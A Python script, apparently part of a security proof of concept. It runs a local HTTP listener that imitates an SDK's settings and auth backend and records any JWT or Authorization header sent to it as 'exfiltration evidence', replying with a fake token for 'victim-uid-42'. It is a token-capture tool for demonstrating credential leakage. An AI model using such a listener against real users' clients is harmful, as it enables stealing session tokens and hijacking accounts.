#!/usr/bin/env python3
# capture-jwt.py — capture+mock 双模式监听器
#  - 所有请求全量记录 (path/headers/body) 到 listener.log
#  - settings 请求 → 返回 mock JSON (让 SDK build() 走通)
#  - 任何带 Authorization 的请求 → 记入 captured-jwt.json (外带证据)
import http.server, json, sys, threading, time

CAPTURED = []

MOCK_SETTINGS = {
    "connectivity": {"connected": True},
    "settings": {
        "canCreateMoreConversations": False,
        "messagingSettings": {},
        "conversationSettings": {},
    },
}

class H(http.server.BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'

    def _log(self, note, extra=''):
        line = '[listener] %s %s | Authorization=%s | %s' % (
            self.command, self.path,
            (self.headers.get('Authorization') or 'NONE')[:60],
            (note + (' | body: ' + extra[:120] if extra else '')))
        print(line, flush=True)

    def _capture(self):
        length = int(self.headers.get('Content-Length', 0) or 0)
        body = self.rfile.read(length).decode('utf-8', 'replace') if length else ''
        auth = self.headers.get('Authorization', '')
        rec = {'method': self.command, 'path': self.path, 'authorization': auth, 'body': body[:500]}
        if auth or 'assertion' in body or 'jwt' in body.lower():
            CAPTURED.append(rec)
        self._log('req', body)
        return body

    def _respond(self, code, obj):
        data = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        self._capture()
        # settings 类请求 → mock; 其余 → 空 JSON
        self._respond(200, MOCK_SETTINGS)

    def do_POST(self):
        body = self._capture()
        # 认证类 POST: 回一个假 token 响应
        if 'jwt' in self.path.lower() or 'auth' in self.path.lower():
            self._respond(200, {"jwt": "poc-captured", "appUser": {"externalId": "victim-uid-42"}})
        else:
            self._respond(200, {"ok": True})

    do_PUT = do_POST
    def log_message(self, *a): pass

if __name__ == '__main__':
    srv = http.server.ThreadingHTTPServer(('127.0.0.1', 18080), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print('[listener] capture+mock up on 127.0.0.1:18080', flush=True)
    deadline = time.time() + (float(sys.argv[1]) if len(sys.argv) > 1 else 300)
    while time.time() < deadline:
        time.sleep(2)
        if CAPTURED:
            break
    with open('captured-jwt.json', 'w') as f:
        json.dump(CAPTURED, f, indent=2)
    print('[listener] captured %d auth request(s)' % len(CAPTURED), flush=True)
